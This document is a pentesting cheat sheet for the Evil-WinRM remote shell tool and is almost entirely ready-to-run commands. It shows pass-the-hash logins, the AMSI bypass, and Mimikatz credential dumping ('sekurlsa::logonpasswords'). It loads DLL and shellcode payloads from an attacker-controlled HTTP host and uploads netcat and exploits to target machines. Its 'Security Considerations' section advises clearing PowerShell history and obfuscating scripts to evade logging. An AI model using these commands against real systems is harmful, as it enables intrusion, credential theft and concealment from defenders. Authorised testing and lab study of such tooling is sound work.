# Evil-WinRM

tags: #Windows #Remote_Access #WinRM #Foundational

resources: [Evil-WinRM GitHub](https://github.com/Hackplayers/evil-winrm), [HackTricks WinRM](https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm)

> [!info] Evil-WinRM is the ultimate WinRM shell for hacking/pentesting. Provides an interactive PowerShell session with file transfer, script loading, and binary execution capabilities.

## Service Discovery

### Port Scanning

```bash
nmap -p5985,5986 <TargetIP>
```

> [!info] Port 5985 - HTTP (plaintext protocol)
> Port 5986 - HTTPS (encrypted)

## Authentication Methods

### Password Authentication

```bash
evil-winrm -i <TargetIP> -u <Username> -p '<Password>'
```

### Domain Authentication

```bash
evil-winrm -i <TargetIP> -u <Username> -p '<Password>' -d <Domain>
```

### Pass the Hash

```bash
evil-winrm -i <TargetIP> -u <Username> -H <NTHash>
```

> [!tip] Only the NT hash is needed, not the full LM:NT format.

### SSL/TLS Connection (Port 5986)

```bash
evil-winrm -i <TargetIP> -u <Username> -p '<Password>' -S
```

> [!important] Use `-S` flag when connecting to port 5986 (HTTPS).

### Certificate-Based Authentication

```bash
evil-winrm -i <TargetIP> -c <Certificate>.pem -k <PrivateKey>.pem -S
```

> [!info] Requires both public certificate (`-c`) and private key (`-k`) files.

### Kerberos Authentication

```bash
evil-winrm -i <Hostname> -r <REALM> -u <Username> -p '<Password>'
```

> [!important] Must use hostname (not IP) for Kerberos authentication.

## File Operations

### Upload Files to Target

```powershell
upload <LocalFile>
```

```powershell
upload <LocalFile> <RemotePath>
```

### Download Files from Target

```powershell
download <RemoteFile>
```

```powershell
download <RemoteFile> <LocalPath>
```

> [!tip] If no path is specified, files are uploaded/downloaded to the current directory.

## Advanced Features

### Loading PowerShell Scripts from Kali

```bash
evil-winrm -i <TargetIP> -u <Username> -p '<Password>' -s /opt/scripts
```

> [!info] The `-s` flag specifies a directory containing PowerShell scripts that can be loaded into the session.

#### Using Loaded Scripts

```powershell
# Once connected with -s flag
Bypass-4MSI
Invoke-Mimikatz.ps1
Invoke-Mimikatz
```

### Loading Executables/Binaries

```bash
evil-winrm -i <TargetIP> -u <Username> -p '<Password>' -e /opt/executables
```

> [!info] The `-e` flag specifies a directory containing executables that can be invoked.

#### Executing Loaded Binaries

```powershell
# View available commands
menu

# Execute binary
Invoke-Binary /opt/executables/winPEASx64.exe
```

### Combined Scripts and Executables

```bash
evil-winrm -i <TargetIP> -u <Username> -p '<Password>' -s /opt/scripts -e /opt/executables
```

### Enable Logging

```bash
evil-winrm -i <TargetIP> -u <Username> -p '<Password>' -l
```

> [!tip] Logs all commands and output to a file for later review.

## Built-in Commands

### View Menu

```powershell
menu
```

> [!info] Displays all available Evil-WinRM commands and loaded scripts/binaries.

### Bypass AMSI

```powershell
Bypass-4MSI
```

> [!important] Run this immediately after connecting to bypass AMSI detection.

### DLL Loader

```powershell
Dll-Loader -http -path http://<AttackerIP>/payload.dll
```

```powershell
Dll-Loader -local -path C:\Windows\Temp\payload.dll
```

### Donut Loader

```powershell
Donut-Loader -http -path http://<AttackerIP>/payload.bin
```

```powershell
Donut-Loader -local -path C:\Windows\Temp\payload.bin
```

### Invoke-Binary

```powershell
Invoke-Binary <BinaryPath>
```

> [!info] Executes binaries from the directory specified with `-e` flag.

## Complete Workflow Example

### Step 1: Prepare Attack Machine

```bash
# Create directories for scripts and executables
mkdir -p /opt/privesc/{scripts,executables}

# Copy PowerShell scripts
cp /opt/PowerUp.ps1 /opt/privesc/scripts/
cp /opt/Invoke-Mimikatz.ps1 /opt/privesc/scripts/

# Copy executables
cp /opt/winPEASx64.exe /opt/privesc/executables/
cp /opt/Rubeus.exe /opt/privesc/executables/
```

### Step 2: Connect with All Features

```bash
evil-winrm -i <TargetIP> -u <Username> -p '<Password>' -s /opt/privesc/scripts -e /opt/privesc/executables
```

### Step 3: Execute Commands

```powershell
# Bypass AMSI
Bypass-4MSI

# View available commands
menu

# Load and execute PowerShell script
PowerUp.ps1
Invoke-AllChecks

# Execute binary
Invoke-Binary winPEASx64.exe

# Upload file
upload /opt/nc.exe C:\Windows\Temp\nc.exe

# Download file
download C:\Users\Administrator\Desktop\flag.txt
```

## Common Use Cases

### Privilege Escalation Enumeration

```bash
evil-winrm -i <TargetIP> -u <Username> -p '<Password>' -s /opt/privesc/scripts
```

```powershell
Bypass-4MSI
PowerUp.ps1
Invoke-AllChecks
```

### Credential Dumping

```bash
evil-winrm -i <TargetIP> -u Administrator -H <NTHash> -s /opt/scripts
```

```powershell
Bypass-4MSI
Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

### File Transfer for Exploitation

```bash
evil-winrm -i <TargetIP> -u <Username> -p '<Password>'
```

```powershell
# Upload exploit
upload /opt/exploit.exe C:\Windows\Temp\exploit.exe

# Execute
C:\Windows\Temp\exploit.exe

# Download results
download C:\Windows\Temp\output.txt
```

## Troubleshooting

### Connection Refused

> [!warning] Ensure WinRM service is running on target and ports 5985/5986 are open.

```bash
# Check if WinRM is accessible
nmap -p5985,5986 <TargetIP>
```

### Authentication Failed

> [!tip] Try different authentication methods:
> - Password authentication
> - Pass the hash
> - Domain authentication with `-d` flag

### SSL Certificate Errors

```bash
# Use -S flag for HTTPS connections
evil-winrm -i <TargetIP> -u <Username> -p '<Password>' -S
```

### Script Execution Blocked

```powershell
# Always run AMSI bypass first
Bypass-4MSI
```

## Security Considerations

> [!important] Evil-WinRM creates a PowerShell session that may be logged. Consider:
> - Using AMSI bypass immediately
> - Clearing PowerShell history after use
> - Using obfuscated scripts when possible

### Clear PowerShell History

```powershell
Remove-Item (Get-PSReadlineOption).HistorySavePath
```
